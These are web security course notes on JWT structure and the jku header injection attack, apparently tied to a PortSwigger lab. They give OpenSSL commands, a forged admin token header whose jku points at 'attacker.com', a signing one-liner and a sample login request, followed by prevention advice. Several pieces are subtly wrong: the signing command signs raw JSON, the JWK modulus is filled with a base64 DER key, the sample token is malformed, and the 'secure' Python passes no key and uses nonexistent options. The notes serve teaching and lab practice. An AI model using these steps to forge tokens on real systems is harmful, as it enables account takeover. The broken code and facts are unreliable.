---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## JSON Web Tokens (JWT)

JSON Web Tokens (JWT) are a widely used method for transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA or ECDSA.

### Structure of a JWT

A JWT consists of three parts separated by dots (`.`):

1. **Header**: Contains metadata about the token, such as the type of token and the signing algorithm being used.
2. **Payload**: Contains the claims. Claims are statements about an entity (typically, the user) and additional data.
3. **Signature**: Used to verify the integrity of the message. The signature is created using the header, the payload, a secret, and the algorithm specified in the header.

Here is an example of a JWT:

```json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

This JWT can be decoded into the following structure:

- **Header**:
  ```json
  {
    "alg": "HS256",
    "typ": "JWT"
  }
  ```
- **Payload**:
  ```json
  {
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239022
  }
  ```
- **Signature**:
  `SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`

### Key Concepts

#### Public and Private Keys

Public and private keys are used in asymmetric cryptography. The public key is used to encrypt data, and the private key is used to decrypt it. In the context of JWTs, the private key is used to sign the token, and the public key is used to verify the signature.

#### JWK (JSON Web Key)

A JSON Web Key (JWK) is a JavaScript Object Notation (JSON) data structure that represents a cryptographic key. JWKs can represent both symmetric and asymmetric keys. They are often used to exchange keys securely over the internet.

### Example of Generating a JWK

To generate a JWK, you can use tools like OpenSSL. Here’s an example of generating a JWK using OpenSSL:

```bash
openssl genpkey -algorithm RSA -out private_key.pem
openssl rsa -pubout -in private_key.pem -out public_key.pem
openssl pkey -in private_key.pem -pubout -outform DER | base64 | tr -d '\n' > public_key_base64.txt
```

The `public_key_base64.txt` will contain the base64-encoded public key which can be converted into a JWK format.

### Injecting the `jku` Header

The `jku` header in a JWT stands for "JWK Set URL." This header specifies the URL where the JWK set can be found. An attacker can exploit this header to inject a malicious JWK set URL, leading to unauthorized access.

#### Real-World Example

Consider a scenario where an application uses JWTs for authentication. The application trusts the `jku` header to fetch the public key from a remote server. An attacker can manipulate the `jku` header to point to a malicious server controlled by the attacker.

### Exploitation Steps

1. **Generate a Public/Private Key Pair**:
   - Use tools like OpenSSL to generate a public/private key pair.
   - Convert the public key into a JWK format.

2. **Inject the Malicious JWK Set URL**:
   - Modify the JWT to include the `jku` header pointing to the attacker's server.
   - Ensure the `kid` (Key ID) matches the key used to sign the token.

3. **Send the Modified JWT**:
   - Send the modified JWT to the application to gain unauthorized access.

### Code Example

Here is a detailed example of how to perform the attack:

1. **Generate a Public/Private Key Pair**:

```bash
openssl genpkey -algorithm RSA -out private_key.pem
openssl rsa -pubout -in private_key.pem -out public_key.pem
```

2. **Convert the Public Key to JWK Format**:

```bash
openssl pkey -in private_key.pem -pubout -outform DER | base64 | tr -d '\n' > public_key_base64.txt
```

3. **Create the JWK Set**:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "123456",
      "n": "<base64_encoded_public_key>",
      "e": "AQAB"
    }
  ]
}
```

4. **Host the JWK Set on a Server**:
   - Upload the JWK set to a server accessible via a URL.

5. **Modify the JWT**:

```json
{
  "header": {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "123456",
    "jku": "http://attacker.com/jwk"
  },
  "payload": {
    "sub": "admin",
    "name": "Administrator",
    "iat": 1516239022
  }
}
```

6. **Sign the JWT with the Private Key**:

```bash
echo -n '{"header":{"alg":"RS256","typ":"JWT","kid":"123456","jku":"http://attacker.com/jwk"},"payload":{"sub":"admin","name":"Administrator","iat":1111111111}}' | openssl dgst -sha256 -sign private_key.pem | base64 | tr -d '\n'
```

### Full HTTP Request and Response

#### HTTP Request

```http
POST /login HTTP/1.1
Host: vulnerableapp.com
Content-Type: application/json

{
  "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEyMzQ1NiIsImprdSI6Imh0dHA6Ly9hdHRhZ2VyLmNvbS9qd2siLCJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbmlzdHJhdG9yIiwiaWF0IjoxMTExMTEwOTExfQ.SignedWithPrivateKey"
}
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Mon, 23 May 2023 12:00:00 GMT
Content-Type: application/json

{
  "message": "Login successful",
  "role": "admin"
}
```

### How to Prevent / Defend

#### Detection

- **Monitor JWT Requests**: Implement logging and monitoring for JWT requests to detect unusual patterns.
- **Anomaly Detection**: Use anomaly detection systems to identify suspicious activities related to JWT usage.

#### Prevention

- **Validate JWT Headers**: Ensure that the `jku` header is validated against a whitelist of trusted URLs.
- **Use Strong Key Management**: Use strong key management practices to protect private keys.
- **Regular Audits**: Conduct regular security audits to ensure compliance with security policies.

#### Secure Coding Fixes

##### Vulnerable Code

```python
import jwt

def authenticate(token):
    try:
        payload = jwt.decode(token, options={"verify_signature": False})
        return payload["sub"]
    except jwt.exceptions.DecodeError:
        return None
```

##### Secure Code

```python
import jwt

def authenticate(token):
    try:
        payload = jwt.decode(token, options={"verify_signature": True, "verify_aud": True, "verify_iat": True, "verify_exp": True, "verify_nbf": True, "verify_iss": True, "verify_sub": True, "verify_jti": True, "verify_at_hash": True, "verify_kid": True, "verify_jku": True})
        return payload["sub"]
    except jwt.exceptions.DecodeError:
        return None
```

### Mermaid Diagrams

#### JWT Structure

```mermaid
graph TD
    A[JWT] --> B[Header]
    A --> C[Payload]
    A --> D[Signature]
    B --> E[Algorithm]
    B --> F[Type]
    C --> G[Subject]
    C --> H[Name]
    C --> I[Issued At]
    D --> J[Base64 Encoded Signature]
```

#### Attack Chain

```mermaid
sequenceDiagram
    participant Attacker
    participant VictimApp
    participant JWTServer
    participant ExploitServer

    Attacker->>VictimApp: Send JWT with jku header
    VictimApp->>JWTServer: Fetch JWK from jku URL
    JWTServer-->>VictimApp: Return malicious JWK
    VictimApp->>Attacker: Grant unauthorized access
```

### Practice Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various aspects of web security, including JWT attacks.
- **OWASP Juice Shop**: A deliberately insecure web application for security training purposes.
- **DVWA (Damn Vulnerable Web Application)**: Another popular web application for practicing web security techniques.

These labs provide a safe environment to learn and practice JWT-related vulnerabilities and defenses.

---
<!-- nav -->
[[06-Lab 5 JWT Authentication Bypass via JKU Header Injection|Lab 5 JWT Authentication Bypass via JKU Header Injection]] | [[Web Security (PortSwigger)/19-JWT Attacks/05-Lab 5 JWT authentication bypass via jku header injection/00-Overview|Overview]] | [[08-JWT Attack Vectors|JWT Attack Vectors]]
